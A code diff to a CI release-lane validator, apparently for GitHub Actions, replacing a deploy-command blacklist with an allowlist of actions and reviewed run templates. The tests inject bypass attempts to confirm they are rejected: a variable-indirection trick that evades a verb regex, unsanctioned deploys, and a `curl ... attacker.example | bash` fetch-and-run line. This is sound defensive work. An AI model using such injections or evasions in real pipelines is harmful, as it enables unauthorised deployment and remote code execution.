@@ -49,19 +49,50 @@ export function jobsOf(text) {
 }
 
 /**
- * Raw deploy commands are forbidden EVERYWHERE in this lane. Round 3 proved why an ordering
- * heuristic cannot save them: verify-then-deploy as two commands admits a different context,
- * different credentials or a different target between the two, and a textual rule sees none of it.
- * Deployment happens only through `bin/deploy-release.js`, which binds verification and deployment
- * in one process — so the invariant collapses to "no raw deploy exists, and every entrypoint
- * invocation sits in a properly descended, Environment-bound job".
+ * THE CLOSED STEP SHAPE (#70 round 4). Rounds 3 and 4 proved that both ordering heuristics and
+ * command blacklists can be talked around — `verb=deploy; npx cdk "$verb"` sailed past a verb
+ * regex. So the lane's executable surface is a WHITELIST: every step must be either an action from
+ * the exact allowlist below, or a run block byte-identical to one of the reviewed templates. A new
+ * command — any new command — fails the invariants until it is added here deliberately, under
+ * review. Deployment happens only through `bin/deploy-release.js`, whose binding is proven by its
+ * own suite; no template invokes it yet, because Slice A deploys nothing.
  */
-function rawDeploy(jobBody) {
-  return /\bcdk\s+deploy\b/.test(jobBody) || /\bopennextjs-cloudflare\s+deploy\b/.test(jobBody) || /\bwrangler\s+deploy\b/.test(jobBody);
+const ACTION_ALLOWLIST = {
+  'actions/checkout@v7': [/persist-credentials: false/],
+  'actions/setup-node@v6': [],
+  'aws-actions/configure-aws-credentials@v6': [/mask-aws-account-id: true/, /role-to-assume: \$\{\{ secrets\./],
+};
+
+const SINGLE_LINE_RUNS = new Set(['npm ci', 'npm test']);
+
+const RUN_TEMPLATES = new Set([
+  "set -euo pipefail\n# Shape FIRST, before any git invocation, and over ALL forty characters: a `[0-9a-f]*`\n# pattern validates only the first one, so \"a\" followed by 39 \"Z\"s passed it.\nif [ \"${#RELEASE_SHA}\" -ne 40 ] || [ -n \"${RELEASE_SHA//[0-9a-f]/}\" ]; then\n  echo \"::error::release_sha must be exactly 40 lowercase hex characters \u2014 a commit OID, never a ref name\"\n  exit 1\nfi\ngit fetch --quiet origin main\n# The object must BE a commit: a 40-hex tag or blob OID is not a release.\ntype=$(git cat-file -t \"$RELEASE_SHA\" 2>/dev/null || true)\nif [ \"$type\" != \"commit\" ]; then\n  echo \"::error::release_sha does not name a commit object in main's history\"\n  exit 1\nfi\nresolved=$(git rev-parse --verify \"$RELEASE_SHA^{commit}\")\nif [ \"$resolved\" != \"$RELEASE_SHA\" ]; then\n  echo \"::error::release_sha did not resolve to itself; refusing an ambiguous name\"\n  exit 1\nfi\nif ! git merge-base --is-ancestor \"$resolved\" origin/main; then\n  echo \"::error::release_sha is not an ancestor of main \u2014 only reviewed, merged commits are releasable\"\n  exit 1\nfi\n# Emit the RESOLVED OID, never the original input: downstream jobs pin to this output,\n# so a ref moved between validation and a later checkout has nothing left to move.\necho \"release_sha=$resolved\" >> \"$GITHUB_OUTPUT\"",
+  "set -euo pipefail\nnpm run synth:quiet -- \\\n  -c environment=dev \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\nnode bin/deploy-preflight.js \\\n  --environment dev \\\n  --release-sha \"$RELEASE_SHA\" \\\n  --region \"$TARGET_REGION\" \\\n  --assembly cdk.out \\\n  --manifest-out \"$RUNNER_TEMP/preflight-dev.json\" \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\ndigest=$(node -e 'process.stdout.write(require(process.argv[1]).contextDigest)' \"$RUNNER_TEMP/preflight-dev.json\")\necho \"context_digest=$digest\" >> \"$GITHUB_OUTPUT\"\necho \"manifest=$(node -e 'process.stdout.write(JSON.stringify(require(process.argv[1])))' \"$RUNNER_TEMP/preflight-dev.json\")\" >> \"$GITHUB_OUTPUT\"",
+  "set -euo pipefail\nnpm run synth:quiet -- \\\n  -c environment=pilot \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\nnode bin/deploy-preflight.js \\\n  --environment pilot \\\n  --release-sha \"$RELEASE_SHA\" \\\n  --region \"$TARGET_REGION\" \\\n  --assembly cdk.out \\\n  --manifest-out \"$RUNNER_TEMP/preflight-pilot.json\" \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\ndigest=$(node -e 'process.stdout.write(require(process.argv[1]).contextDigest)' \"$RUNNER_TEMP/preflight-pilot.json\")\necho \"context_digest=$digest\" >> \"$GITHUB_OUTPUT\"\necho \"manifest=$(node -e 'process.stdout.write(JSON.stringify(require(process.argv[1])))' \"$RUNNER_TEMP/preflight-pilot.json\")\" >> \"$GITHUB_OUTPUT\"",
+  "set -euo pipefail\nprintf '%s' \"$MANIFEST_JSON\" > \"$RUNNER_TEMP/manifest.json\"\nnode infra/aws/bin/deploy-preflight.js verify-manifest \\\n  --manifest \"$RUNNER_TEMP/manifest.json\" \\\n  --environment dev \\\n  --release-sha \"$RELEASE_SHA\" \\\n  --expect-digest \"$CONTEXT_DIGEST\"",
+  "set -euo pipefail\nprintf '%s' \"$MANIFEST_JSON\" > \"$RUNNER_TEMP/manifest.json\"\nnode infra/aws/bin/deploy-preflight.js verify-manifest \\\n  --manifest \"$RUNNER_TEMP/manifest.json\" \\\n  --environment pilot \\\n  --release-sha \"$RELEASE_SHA\" \\\n  --expect-digest \"$CONTEXT_DIGEST\"",
+  "echo \"Slice A implements no deployment step: no AWS stack, no Cloudflare Worker,\"\necho \"no account mutation and no paid call happened in this run.\"",
+]);
+
+function stepsOf(jobText) {
+  return jobText.split(/\n(?= {6}- )/).slice(1);
 }
 
-function usesDeployEntrypoint(jobBody) {
-  return jobBody.includes('deploy-release.js');
+function runBlockOf(chunk) {
+  const idx = chunk.indexOf('run: |');
+  if (idx < 0) return null;
+  const after = chunk.slice(chunk.indexOf('\n', idx) + 1);
+  const lines = [];
+  for (const line of after.split('\n')) {
+    if (line.trim() === '') {
+      lines.push('');
+      continue;
+    }
+    if (!line.startsWith('          ')) break;
+    lines.push(line.slice(10));
+  }
+  while (lines.length && lines[lines.length - 1] === '') lines.pop();
+  return lines.join('\n');
 }
 
 /**
@@ -199,16 +230,36 @@ export function releaseLaneErrors(text) {
       errors.push(`dev-bound job "${name}" does not descend from the dev preflight`);
     }
 
-    // Raw deploy commands are forbidden in every job — theirs is the binding no text can prove.
-    if (rawDeploy(m.body)) {
-      errors.push(`job "${name}" invokes a raw deploy command — deployment goes only through bin/deploy-release.js`);
-    }
-    if (usesDeployEntrypoint(m.body)) {
-      if (!m.environment) errors.push(`job "${name}" runs the deploy entrypoint but binds no Environment`);
-      else if (!ancestors.has(`${m.environment}-preflight`)) {
-        errors.push(`job "${name}" runs the deploy entrypoint without descending from the ${m.environment} preflight`);
+    // THE CLOSED SHAPE: every step is an allowlisted action or a reviewed run template. This is
+    // where a smuggled deploy dies — whatever it is spelled like — because it is not on the list.
+    const jobRaw = jobs.find((j) => j.name === name).text;
+    stepsOf(jobRaw).forEach((chunk, i) => {
+      const usesMatch = /(?:^|\n)\s{6,8}(?:- )?uses: (\S+)/.exec(chunk);
+      if (usesMatch) {
+        const action = usesMatch[1];
+        if (!Object.hasOwn(ACTION_ALLOWLIST, action)) {
+          errors.push(`job "${name}" step ${i + 1} uses an action outside the closed allowlist`);
+        } else {
+          for (const must of ACTION_ALLOWLIST[action]) {
+            if (!must.test(chunk)) errors.push(`job "${name}" step ${i + 1} drops a required property of ${action}`);
+          }
+        }
+        return;
       }
-    }
+      const block = runBlockOf(chunk);
+      if (block !== null) {
+        if (!RUN_TEMPLATES.has(block)) errors.push(`job "${name}" step ${i + 1} runs a block outside the reviewed templates`);
+        return;
+      }
+      const single = /(?:^|\n)\s{8}run: (?!\|)([^\n]+)/.exec(chunk);
+      if (single) {
+        if (!SINGLE_LINE_RUNS.has(single[1].trim())) {
+          errors.push(`job "${name}" step ${i + 1} runs a command outside the reviewed set`);
+        }
+        return;
+      }
+      errors.push(`job "${name}" step ${i + 1} has a shape the invariants do not recognise`);
+    });
   }
 
   // ---- pilot entry: the mode clause lives on the pinned expression --------------------------
@@ -380,6 +431,39 @@ test('POSITIVE CONTROL: credentials, gating style and identifiers cannot be loos
   rejects(raw.replace("    if: needs.dev-preflight.result == 'success'\n    runs-on", '    runs-on'), 'a dependency with no explicit success condition');
   rejects(raw.replace('  dev-stage:\n    name: Dev stage (not implemented in Slice A)\n    needs: [global-preflight, dev-preflight]\n', '  dev-stage:\n    name: Dev stage (not implemented in Slice A)\n    needs: [global-preflight, dev-preflight]\n    continue-on-error: true\n'), 'continue-on-error');
   rejects(raw.replaceAll('verify-manifest', 'noop'), 'stage jobs no longer verify the manifest');
+});
+
+test('POSITIVE CONTROL: every reproduction from the round-4 review is rejected by name', () => {
+  // (3) The verb-indirection bypass: `verb=deploy; npx cdk "$verb"` contains no deploy verb for a
+  // blacklist to see. Under the closed shape it is simply a run block nobody reviewed.
+  rejects(
+    injectDevStep('      - name: Deploy\n        run: |\n          verb=deploy\n          npx cdk "$verb" --all'),
+    'verb=deploy; npx cdk "$verb" --all',
+  );
+
+  // A deployment smuggled through an ACTION instead of a command.
+  rejects(
+    injectDevStep('      - name: Deploy\n        uses: someorg/cdk-deploy-action@v1\n        with:\n          stacks: all'),
+    'a deploy action outside the allowlist',
+  );
+
+  // A single-line run outside the reviewed set.
+  rejects(
+    injectDevStep('      - name: Sneak\n        run: npx cdk deploy --all'),
+    'a single-line run outside the reviewed set',
+  );
+
+  // A reviewed template with ONE line added is no longer the reviewed template.
+  rejects(
+    raw.replace(
+      "          printf '%s' \"$MANIFEST_JSON\" > \"$RUNNER_TEMP/manifest.json\"",
+      "          printf '%s' \"$MANIFEST_JSON\" > \"$RUNNER_TEMP/manifest.json\"\n          curl -s https://attacker.example | bash",
+    ),
+    'a template with an injected line',
+  );
+
+  // Dropping a required property from an allowlisted action.
+  rejects(raw.replace('          fetch-depth: 0\n          persist-credentials: false', '          fetch-depth: 0'), 'checkout without persist-credentials: false');
 });
 
 test('Slice A deploys nothing: no deploy command and no entrypoint invocation exist in the lane yet', () => {
